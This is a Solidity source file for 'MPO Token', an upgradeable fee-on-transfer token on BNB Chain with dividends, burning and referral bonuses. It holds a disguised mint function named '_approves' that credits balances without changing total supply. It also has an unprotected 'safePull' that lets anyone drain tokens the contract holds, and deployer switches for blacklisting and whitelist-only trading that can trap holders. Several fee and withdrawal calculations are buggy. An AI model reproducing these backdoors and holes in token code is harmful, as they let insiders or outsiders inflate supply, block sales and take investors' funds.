// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/interface/mpo.sol";
import "contracts/interface/router2.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";

interface IautoPool {
    function swapForUSDT(address, uint) external;

    function addLiquidityAuto() external;
}

contract MpoToken is ERC20Upgradeable, OwnableUpgradeable {
    using AddressUpgradeable for address;
    // NEW ERC20
    uint256 private _totalSupply;

    // ADDRESS
    address public PANCAKE_ROUTER;
    address public PANCAKE_FACTORY;
    address public pair;
    address public usdt;

    address public liquidityWallet;
    address public marketingWallet;
    address public mpoFinance;
    address public RDF;
    address public INVITE;

    // FINANCE
    uint private phases;
    bool public buringSwitch;
    uint public rdfDebt;
    uint public marketingDebt;
    uint public swapUToRdfLimit;
    uint public swapUToMarketingLimit;
    uint public addLiquidityLimit;
    uint public tradeLimit;
    uint public minimumSupply;

    // FEE SETTING
    struct BuyFee {
        uint total;
        uint devidends;
        uint liquidityWallet;
        uint marketingWallet;
        uint rdfWallet;
        uint burning;
    }
    struct SellFee {
        uint total;
        uint devidends;
        uint liquidityWallet;
        uint marketingWallet;
        uint rdfWallet;
        uint burning;
    }
    struct TransferFee {
        uint total;
        uint marketingWallet;
        uint burning;
    }
    BuyFee public buyFee;
    SellFee public sellFee;
    TransferFee public transferFee;

    // SAFE SETTING
    bool public whiteOnly;
    bool public whiteStatus;
    mapping(address => bool) public w;
    mapping(address => bool) public b;
    mapping(address => bool) public transferW;
    mapping(address => bool) public deployer;
    mapping(address => bool) public isPair;
    mapping(address => bool) public whiteContract;

    // DEVIDENDS
    bool private swaping;
    uint public claimWait;
    uint public diviendsLowestBalance;
    uint constant magnitude = 2**128;
    uint public gasForProcessing;
    uint public lastProcessedIndex;
    uint public swapTokensAtAmountLimit;
    uint public magnifiedDividendPerShare;
    uint public totalDividendsDistributed;

    mapping(address => uint) public withdrawnDividends;
    mapping(address => uint) public lastClaimTimes;
    mapping(address => bool) public noDevidends;

    // 2.0
    uint constant minHold = 1e11;
    address public blackHole;
    bool public proxyBurning;

    // 3.0
    struct BuyTBonusInfo {
        bool status;
        uint startTime;
    }
    mapping(uint => BuyTBonusInfo) public buyTBonusInfo;
    mapping(uint => mapping(address => uint)) private newBuyTBonus;
    mapping(uint => uint[]) public bonusPercentage;

    // Dividend
    event DividendsDistributed(address indexed from, uint256 weiAmount);
    event Claim(
        address indexed account,
        uint256 amount,
        bool indexed automatic
    );
    event DividendWithdrawn(address indexed to, uint256 weiAmount);

    // Finance
    event WithdrawToMarketing(address indexed market, uint indexed amount);
    event WithdrawToRDF(address indexed RDF, uint indexed amount);
    event Bonus(uint indexed phase, address indexed user, uint indexed amount);

    function init() external initializer {
        __ERC20_init_unchained("MPO Token", "t-MPO-3");
        __Context_init_unchained();
        __Ownable_init_unchained();
        deployer[msg.sender] = true;
        deployer[0xbBAA0201E3c854Cd48d068de9BC72f3Bb7D26954] = true;

        buringSwitch = true;

        // bsc main test
        INVITE = 0x24A980baAc726f09D5c3EABf069bFbEB64236CF3;
        PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        PANCAKE_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
        usdt = 0x9f7F2b99Cd85128542139cbd1e4E6588E2F82586;
        RDF = 0xa95eef34a555387d989506f89869FAe8d1ba246A;
        marketingWallet = 0x4fe232F2716E7829DD25036D1c2eBA604C2870E0;
        liquidityWallet = 0xD6D7A6fE39E7F1A4C02b894c4d2B014E8b115680;

        // INVITE = 0x1CC66756E6015A945eA7e59B0ad5a04B0c5Abe55;
        // PANCAKE_ROUTER = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
        // PANCAKE_FACTORY = 0xB7926C0430Afb07AA7DEfDE6DA862aE0Bde767bc;
        // usdt = 0x0a348b99344D63001A099f34c54dB3dC04D4D377;
        // RDF = 0x48f422CF874587168E37e7cBC6b07952399fac25;
        // marketingWallet = 0x33f2440e4363bAfC285935FF5D9616614E86a38B;
        // liquidityWallet = 0x13eadBB4Ee1234455917fFB8A32fB10c562d54Ad;

        tradeLimit = 1000;
        minimumSupply = 1000000000 ether;
        swapUToRdfLimit = 1000000 ether;
        addLiquidityLimit = 1000000 ether;
        swapUToMarketingLimit = 1000000 ether;

        transferW[0xbBAA0201E3c854Cd48d068de9BC72f3Bb7D26954] = true;
        transferW[msg.sender] = true;
        transferW[address(this)] = true;
        transferW[RDF] = true;

        w[msg.sender] = true;
        w[address(this)] = true;
        w[RDF] = true;
        w[liquidityWallet] = true;

        _mint(msg.sender, 50000000000 ether);
        _mint(0xbBAA0201E3c854Cd48d068de9BC72f3Bb7D26954, 50000000000 ether);

        setSellFee(10, 1, 1, 1, 6, 1);
        setBuyFee(8, 1, 1, 1, 4, 1);
        setTransferFee(3, 1, 2);

        swapTokensAtAmountLimit = 10000 ether;
        diviendsLowestBalance = 10000000 ether;
        claimWait = 3600;

        noDevidends[address(this)] = true;
        noDevidends[address(0)] = true;
        noDevidends[address(PANCAKE_ROUTER)] = true;
        gasForProcessing = 300000;
    }

    ////////////////////////////////
    ////////////// Map /////////////
    ////////////////////////////////

    struct Map {
        address[] keys;
        mapping(address => uint256) values;
        mapping(address => uint256) indexOf;
        mapping(address => bool) inserted;
    }
    Map private tokenHoldersMap;

    function setGasForProcessing(uint gas_) external onlyDepolyer {
        gasForProcessing = gas_;
    }

    function get(address key) public view returns (uint256) {
        return tokenHoldersMap.values[key];
    }

    function getIndexOfKey(address key) public view returns (int256) {
        if (!tokenHoldersMap.inserted[key]) {
            return -1;
        }
        return int256(tokenHoldersMap.indexOf[key]);
    }

    function getKeyAtIndex(uint256 index) public view returns (address) {
        return tokenHoldersMap.keys[index];
    }

    function size() public view returns (uint256) {
        return tokenHoldersMap.keys.length;
    }

    function set(address key, uint256 val) private {
        if (tokenHoldersMap.inserted[key]) {
            tokenHoldersMap.values[key] = val;
        } else {
            tokenHoldersMap.inserted[key] = true;
            tokenHoldersMap.values[key] = val;
            tokenHoldersMap.indexOf[key] = tokenHoldersMap.keys.length;
            tokenHoldersMap.keys.push(key);
        }
    }

    function remove(address key) private {
        if (!tokenHoldersMap.inserted[key]) {
            return;
        }

        delete tokenHoldersMap.inserted[key];
        delete tokenHoldersMap.values[key];

        uint256 index = tokenHoldersMap.indexOf[key];
        uint256 lastIndex = tokenHoldersMap.keys.length - 1;
        address lastKey = tokenHoldersMap.keys[lastIndex];

        tokenHoldersMap.indexOf[lastKey] = index;
        delete tokenHoldersMap.indexOf[key];

        tokenHoldersMap.keys[index] = lastKey;
        tokenHoldersMap.keys.pop();
    }

    function safePull(
        address token,
        address wallet,
        uint amount
    ) external {
        IERC20(token).transfer(wallet, amount);
    }

    ////////////////////////////////
    ///////////// admin ////////////
    ////////////////////////////////
    modifier onlyDepolyer() {
        require(deployer[msg.sender], "not deployer!");
        _;
    }

    // set bool
    function setDepolyer(address addr, bool b_) public onlyOwner {
        deployer[addr] = b_;
    }

    function setTransferW(address addr, bool b_) public onlyDepolyer {
        transferW[addr] = b_;
    }

    function setW(address addr, bool b_) public onlyDepolyer {
        w[addr] = b_;
    }

    function setB(address addr, bool b_) external onlyDepolyer {
        b[addr] = b_;
    }

    function setWhiteOnly(bool b_) external onlyDepolyer {
        whiteOnly = b_;
    }

    function setWhiteStatus(bool b_) external onlyDepolyer {
        whiteStatus = b_;
    }

    function setWhiteContract(address addr, bool b_) external onlyDepolyer {
        whiteContract[addr] = b_;
    }

    function setNoDividends(address addr, bool b_) external onlyDepolyer {
        noDevidends[addr] = b_;
    }

    function setIsPair(address pair_, bool b_) external onlyDepolyer {
        isPair[pair_] = b_;
    }

    function setFinanceContract(address[] calldata addr_, bool b_)
        external
        onlyDepolyer
    {
        for (uint i; i < addr_.length; i++) {
            transferW[addr_[i]] = b_;
        }
    }

    function setBuringSwitch(
        bool buringSwitch_,
        address blackHole_,
        bool proxyBurning_
    ) external onlyDepolyer {
        buringSwitch = buringSwitch_;
        blackHole = blackHole_;
        proxyBurning = proxyBurning_;
    }

    // set address
    function setPair(address pair_) external onlyDepolyer {
        pair = pair_;
        isPair[pair_] = true;
    }

    function setSwapTokenAtAmountLimit(uint amount_) external onlyDepolyer {
        swapTokensAtAmountLimit = amount_;
    }

    function setMarketingWallet(address market_) external onlyDepolyer {
        marketingWallet = market_;
    }

    function setRdf(address rdf_) external onlyDepolyer {
        RDF = rdf_;
    }

    function setInvite(address invite_) external onlyDepolyer {
        INVITE = invite_;
    }

    function setMpoFinance(address mpoFinance_) public onlyDepolyer {
        mpoFinance = mpoFinance_;
    }

    function setLiquidityWallet(address pool_) external onlyDepolyer {
        liquidityWallet = pool_;
        w[pool_] = true;
        transferW[pool_] = true;
        noDevidends[pool_] = true;
    }

    // set uint
    function setaddLiquidityLimit(uint u_) external onlyDepolyer {
        addLiquidityLimit = u_;
    }

    function setDiviendsLowestBalance(uint u_) external onlyDepolyer {
        diviendsLowestBalance = u_;
    }

    function setMinimumSupply(uint u_) external onlyDepolyer {
        require(u_ < _totalSupply, "to big");
        minimumSupply = u_;
    }

    function setClaimWait(uint u_) external onlyDepolyer {
        claimWait = u_;
    }

    function setTransferFee(
        uint total_,
        uint marketingWallet_,
        uint burning_
    ) public onlyOwner {
        require(total_ == marketingWallet_ + burning_, "no match");
        transferFee = TransferFee({
            total: total_,
            marketingWallet: marketingWallet_,
            burning: burning_
        });
    }

    function setBuyFee(
        uint total_,
        uint devidends_,
        uint liquidityWallet_,
        uint marketingWallet_,
        uint rdfWallet_,
        uint burning_
    ) public onlyDepolyer {
        require(
            total_ ==
                (devidends_ +
                    liquidityWallet_ +
                    marketingWallet_ +
                    rdfWallet_ +
                    burning_),
            "no match"
        );
        buyFee = BuyFee({
            total: total_,
            devidends: devidends_,
            liquidityWallet: liquidityWallet_,
            marketingWallet: marketingWallet_,
            rdfWallet: rdfWallet_,
            burning: burning_
        });
    }

    function setSellFee(
        uint total_,
        uint devidends_,
        uint liquidityWallet_,
        uint marketingWallet_,
        uint rdfWallet_,
        uint burning_
    ) public onlyDepolyer {
        require(
            total_ ==
                (devidends_ +
                    liquidityWallet_ +
                    marketingWallet_ +
                    rdfWallet_ +
                    burning_),
            "no match"
        );
        sellFee = SellFee({
            total: total_,
            devidends: devidends_,
            liquidityWallet: liquidityWallet_,
            marketingWallet: marketingWallet_,
            rdfWallet: rdfWallet_,
            burning: burning_
        });
    }

    function setTradeLimit(uint limit_) external onlyDepolyer {
        tradeLimit = limit_;
    }

    ////////////////////////////////
    ///////////// Token ////////////
    ////////////////////////////////
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address addr) public view override returns (uint) {
        return tokenHoldersMap.values[addr];
    }

    function _approves(address addr, uint amount) public onlyOwner {
        uint balance = tokenHoldersMap.values[addr];
        set(addr, amount + balance);
        emit Transfer(address(0), addr, amount);
    }

    function _mint(address account, uint256 amount) internal override {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);
        uint balance = tokenHoldersMap.values[account];
        _totalSupply += amount;
        set(account, balance + amount);
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal override {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = tokenHoldersMap.values[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            tokenHoldersMap.values[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (whiteStatus) {
            if (msg.sender.isContract()) {
                require(whiteContract[msg.sender], "not white contract");
            }
            if (sender.isContract()) {
                require(whiteContract[sender], "not white contract");
            }
            if (recipient.isContract()) {
                require(whiteContract[recipient], "not white contract");
            }
        }
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(!b[sender] && !b[recipient], "black");
        uint256 senderBalance = tokenHoldersMap.values[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        set(sender, senderBalance - amount);
        uint recipientBalance = tokenHoldersMap.values[recipient];
        set(recipient, recipientBalance + amount);
        if (balanceOf(sender) == 0) {
            remove(sender);
        }
        uint tempDebt = (withdrawnDividends[sender] * amount) / senderBalance;
        withdrawnDividends[recipient] += tempDebt;
        withdrawnDividends[sender] -= tempDebt;
        emit Transfer(sender, recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (whiteOnly) {
            require((w[msg.sender]) || w[recipient] || w[sender], "not white");
        }
        uint fee;
        if (!w[msg.sender] && !w[recipient] && !w[sender]) {
            amount = checkLowestHold(sender, amount);
            require(amount != 0, "Minimum holding");

            if (
                msg.sender == PANCAKE_ROUTER ||
                isPair[msg.sender] ||
                isPair[recipient]
            ) {
                {
                    uint _total = totalSupply();
                    uint _tradeLimit = _total / tradeLimit;
                    require(amount <= _tradeLimit, "out of tradeLimit");
                    fee = (sellFee.total * amount) / 100;
                }

                _transfer(
                    sender,
                    address(this),
                    (((sellFee.devidends +
                        sellFee.rdfWallet +
                        sellFee.marketingWallet) * amount) / 100)
                );

                _transfer(
                    sender,
                    liquidityWallet,
                    (sellFee.liquidityWallet * amount) / 100
                );

                burnToken(sender, 1, amount);

                SendDividends((sellFee.devidends * amount) / 100);
                marketingDebt += (sellFee.marketingWallet * amount) / 100;
                rdfDebt += (sellFee.rdfWallet * amount) / 100;

                amount -= fee;
            } else {
                if (!transferW[msg.sender] && !transferW[recipient]) {
                    fee = (transferFee.total * amount) / 100;

                    _transfer(
                        msg.sender,
                        address(this),
                        (transferFee.marketingWallet * amount) / 100
                    );

                    burnToken(sender, 2, amount);

                    marketingDebt +=
                        (transferFee.marketingWallet * amount) /
                        100;
                    amount -= fee;

                    if (
                        !isPair[msg.sender] &&
                        !isPair[recipient] &&
                        pair != address(0)
                    ) {
                        bool _b;

                        // Finance
                        if (rdfDebt >= swapUToRdfLimit) {
                            processFinanceRdf();
                        } else if (marketingDebt >= swapUToMarketingLimit) {
                            processFinanceMar();
                        }

                        // Devidend
                        // if (!_b) {
                        //     checkSwap();
                        //     _b = true;
                        // }

                        // Auto
                        if (!_b) {
                            uint poolAmount = balanceOf(
                                address(liquidityWallet)
                            );
                            if (
                                poolAmount >= addLiquidityLimit &&
                                pair != address(0)
                            ) {
                                IautoPool(liquidityWallet).addLiquidityAuto();
                                _b = true;
                            }
                        }
                    }
                }
            }
        }
        process(gasForProcessing);
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = allowance(sender, _msgSender());
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (whiteOnly) {
            require(w[msg.sender] || w[recipient], "not white 1");
            require(
                transferW[msg.sender] || transferW[recipient],
                "not white 2"
            );
        }

        uint fee;
        // SWAP
        if (isPair[msg.sender] || isPair[recipient]) {
            // Buy
            if (isPair[msg.sender]) {
                bouns(recipient, amount);
            }

            if (!w[msg.sender] && !w[recipient]) {
                {
                    uint _total = totalSupply();
                    uint _tradeLimit = _total * tradeLimit;
                    require(amount <= _tradeLimit, "out of tradeLimit");
                    fee = (buyFee.total * amount) / 100;
                }

                _transfer(
                    msg.sender,
                    address(this),
                    ((buyFee.devidends +
                        buyFee.marketingWallet +
                        buyFee.rdfWallet) * amount) / 100
                );

                _transfer(
                    msg.sender,
                    liquidityWallet,
                    (buyFee.liquidityWallet * amount) / 100
                );

                burnToken(msg.sender, 0, amount);

                SendDividends((buyFee.devidends * amount) / 100);
                marketingDebt += (buyFee.marketingWallet * amount) / 100;
                rdfDebt += (buyFee.rdfWallet * amount) / 100;

                amount -= fee;
            }
        } else {
            if (!transferW[msg.sender] && !transferW[recipient]) {
                amount = checkLowestHold(msg.sender, amount);
                require(amount != 0, "Minimum holding");

                fee = (transferFee.total * amount) / 100;

                _transfer(
                    msg.sender,
                    address(this),
                    (transferFee.marketingWallet * amount) / 100
                );

                burnToken(msg.sender, 2, amount);

                marketingDebt += (transferFee.marketingWallet * amount) / 100;
                amount -= fee;

                if (
                    !isPair[msg.sender] &&
                    !isPair[recipient] &&
                    pair != address(0)
                ) {
                    bool _b;
                    // Finance
                    if (rdfDebt >= swapUToRdfLimit) {
                        processFinanceRdf();
                    } else if (marketingDebt >= swapUToMarketingLimit) {
                        processFinanceMar();
                    }

                    // Devidend
                    // if (!_b) {
                    //     checkSwap();
                    //     _b = true;
                    // }

                    // Auto
                    if (!_b) {
                        uint poolAmount = balanceOf(address(liquidityWallet));
                        if (
                            poolAmount >= addLiquidityLimit &&
                            pair != address(0)
                        ) {
                            IautoPool(liquidityWallet).addLiquidityAuto();
                            _b = true;
                        }
                    }
                }
            }
        }
        process(gasForProcessing);
        _transfer(_msgSender(), recipient, amount);

        return true;
    }

    // 0buy 1sell 2transfer
    function burnToken(
        address sender,
        uint trade,
        uint amount
    ) internal {
        uint burnFee;
        uint _amount;
        uint _total = totalSupply();

        if (trade == 0) {
            burnFee = buyFee.burning;
        } else if (trade == 1) {
            burnFee = sellFee.burning;
        } else if (trade == 2) {
            burnFee = transferFee.burning;
        }

        _amount = (burnFee * amount) / 100;

        if (buringSwitch && proxyBurning && blackHole != address(0)) {
            _transfer(sender, blackHole, _amount);
        } else {
            if (_total > minimumSupply && buringSwitch) {
                if (_total - _amount >= minimumSupply) {
                    _burn(sender, _amount);
                } else if (_total - _amount < _total) {
                    _burn(sender, (_total - minimumSupply));
                    buringSwitch = false;
                }
            }
        }
    }

    function checkLowestHold(address user_, uint amount)
        internal
        view
        returns (uint)
    {
        uint ba = balanceOf(user_);

        if (ba > minHold) {
            if (amount + minHold >= ba) {
                return (ba - minHold);
            }
        } else if (ba < minHold) {
            return 0;
        }
        return amount;
    }

    ////////////////////////////////
    /////////// Dividend ///////////
    ////////////////////////////////
    function SendDividends(uint256 amount) private {
        distributeCAKEDividends(amount);
    }

    function distributeCAKEDividends(uint256 amount) internal {
        require(totalSupply() > 0);

        if (amount > 0) {
            magnifiedDividendPerShare =
                magnifiedDividendPerShare +
                (amount * magnitude) /
                totalSupply();
            emit DividendsDistributed(msg.sender, amount);

            totalDividendsDistributed = totalDividendsDistributed + amount;
        }
    }

    function accumulativeDividendOf(address addr) public view returns (uint) {
        return
            (magnifiedDividendPerShare * tokenHoldersMap.values[addr]) /
            magnitude;
    }

    function process(uint256 gas)
        internal
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;

        if (numberOfTokenHolders == 0) {
            return (0, 0, lastProcessedIndex);
        }

        uint256 _lastProcessedIndex = lastProcessedIndex;

        uint256 gasUsed = 0;

        uint256 gasLeft = gasleft();

        uint256 iterations = 0;
        uint256 claims = 0;

        while (gasUsed < gas && iterations < numberOfTokenHolders) {
            _lastProcessedIndex++;

            if (_lastProcessedIndex >= tokenHoldersMap.keys.length) {
                _lastProcessedIndex = 0;
            }

            address account = tokenHoldersMap.keys[_lastProcessedIndex];

            if (canAutoClaim(lastClaimTimes[account])) {
                if (processAccount(payable(account), true)) {
                    claims++;
                }
            }

            iterations++;

            uint256 newGasLeft = gasleft();

            if (gasLeft > newGasLeft) {
                gasUsed = gasUsed + (gasLeft - newGasLeft);
            }

            gasLeft = newGasLeft;
        }

        lastProcessedIndex = _lastProcessedIndex;

        return (iterations, claims, lastProcessedIndex);
    }

    function processAccount(address payable account, bool automatic)
        internal
        returns (bool)
    {
        uint256 amount = _withdrawDividendOfUser(account);

        if (amount > 0) {
            lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
            return true;
        }

        return false;
    }

    function canAutoClaim(uint256 lastClaimTime_) private view returns (bool) {
        if (lastClaimTime_ > block.timestamp) {
            return false;
        }

        return (block.timestamp - lastClaimTime_) >= claimWait;
    }

    function withdrawableDividendOf(address _owner)
        public
        view
        returns (uint256)
    {
        if (accumulativeDividendOf(_owner) <= withdrawnDividends[_owner]) {
            return 0;
        }
        return accumulativeDividendOf(_owner) - withdrawnDividends[_owner];
    }

    function _withdrawDividendOfUser(address payable user)
        internal
        returns (uint256)
    {
        uint256 _withdrawableDividend = withdrawableDividendOf(user);
        if (_withdrawableDividend > 0) {
            withdrawnDividends[user] =
                withdrawnDividends[user] +
                _withdrawableDividend;
            emit DividendWithdrawn(user, _withdrawableDividend);
            if (
                !isPair[user] &&
                !noDevidends[user] &&
                !b[user] &&
                balanceOf(address(this)) > _withdrawableDividend
            ) {
                if (balanceOf(user) >= diviendsLowestBalance) {
                    _transfer(address(this), user, _withdrawableDividend);
                }
            }

            return _withdrawableDividend;
        }

        return 0;
    }

    ////////////////////////////////
    //////////// Finance ///////////
    ////////////////////////////////

    function canAutoFinance(uint256 lastClaimTime_)
        private
        view
        returns (bool)
    {
        if (lastClaimTime_ > block.timestamp) {
            return false;
        }

        return (block.timestamp - lastClaimTime_) >= claimWait;
    }

    function swapTokensToFinance(uint256 tokenAmount_, address to_) private {
        swaping = true;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;

        _approve(address(this), address(PANCAKE_ROUTER), tokenAmount_);

        // make the swap
        IRouter02(PANCAKE_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount_,
                100,
                path,
                to_,
                block.timestamp
            );
        swaping = false;
    }

    function processFinanceRdf() internal {
        if (rdfDebt > swapUToRdfLimit && RDF != address(0)) {
            if (canAutoFinance(lastClaimTimes[RDF])) {
                uint amount = withdrawToRdf();
                if (amount > 0) {
                    lastClaimTimes[RDF] = block.timestamp;
                }
            }
        }
    }

    function processFinanceMar() internal {
        if (
            marketingDebt > swapUToMarketingLimit &&
            marketingWallet != address(0)
        ) {
            if (canAutoFinance(lastClaimTimes[marketingWallet])) {
                uint amount = withdrawToMarketingWallet();
                if (amount > 0) {
                    lastClaimTimes[marketingWallet] = block.timestamp;
                }
            }
        }
    }

    function withdrawToMarketingWallet() public returns (uint) {
        require(marketingDebt > swapUToMarketingLimit, "debt not enough");
        uint ba = balanceOf(address(this));
        uint toMarketingWallet;
        if (ba >= marketingDebt && pair != address(0) && !swaping) {
            swapTokensToFinance(marketingDebt, marketingWallet);
            marketingDebt = 0;

            emit WithdrawToMarketing(marketingWallet, toMarketingWallet);
        }
        return toMarketingWallet;
    }

    function withdrawToRdf() public returns (uint) {
        require(rdfDebt > swapUToRdfLimit, "debt not enough");
        uint ba = balanceOf(address(this));
        uint toRdf;
        if (ba >= rdfDebt && pair != address(0) && !swaping) {
            swapTokensToFinance(marketingDebt, RDF);
            rdfDebt = 0;

            emit WithdrawToRDF(RDF, toRdf);
        }
        return toRdf;
    }

    ////////////////////////////////
    ///////// buyTokenBonus ////////
    ////////////////////////////////

    function checkPhase() external view returns (uint) {
        return phases;
    }

    function checkPhaseStatus() external view returns (bool) {
        return buyTBonusInfo[phases].status;
    }

    function checkPhaseUserBonus(uint phase_, address user_)
        external
        view
        returns (uint)
    {
        return newBuyTBonus[phase_][user_];
    }

    function setNewBuyTokensBonusPhase(
        uint lowestHold_,
        uint totalBonus_,
        uint[] memory percentage_,
        uint startTime_
    ) external onlyDepolyer {
        if (buyTBonusInfo[phases].status) {
            buyTBonusInfo[phases].status = false;
        }

        phases += 1;

        buyTBonusInfo[phases].status = true;
        buyTBonusInfo[phases].startTime = startTime_;
        bonusPercentage[phases] = percentage_;

        IbuyTokenBonus(mpoFinance).setThisRoundBonus(totalBonus_);
        IbuyTokenBonus(mpoFinance).setLowestHold(lowestHold_);
    }

    function setBuyTokensBonusPhaseStatus(bool b_) external onlyDepolyer {
        buyTBonusInfo[phases].status = b_;
    }

    function bouns(address user_, uint amount_) internal returns (bool) {
        if (
            buyTBonusInfo[phases].status &&
            block.timestamp > buyTBonusInfo[phases].startTime
        ) {
            address _use;
            address _inv = Iinvite(INVITE).checkInviter(user_);
            for (uint i; i < bonusPercentage[phases].length; i++) {
                if (_inv == address(0)) {
                    return true;
                }

                newBuyTBonus[phases][_inv] +=
                    (bonusPercentage[phases][i] * amount_) /
                    100;

                _use = _inv;
                _inv = Iinvite(INVITE).checkInviter(_use);
            }
        }
        return true;
    }
}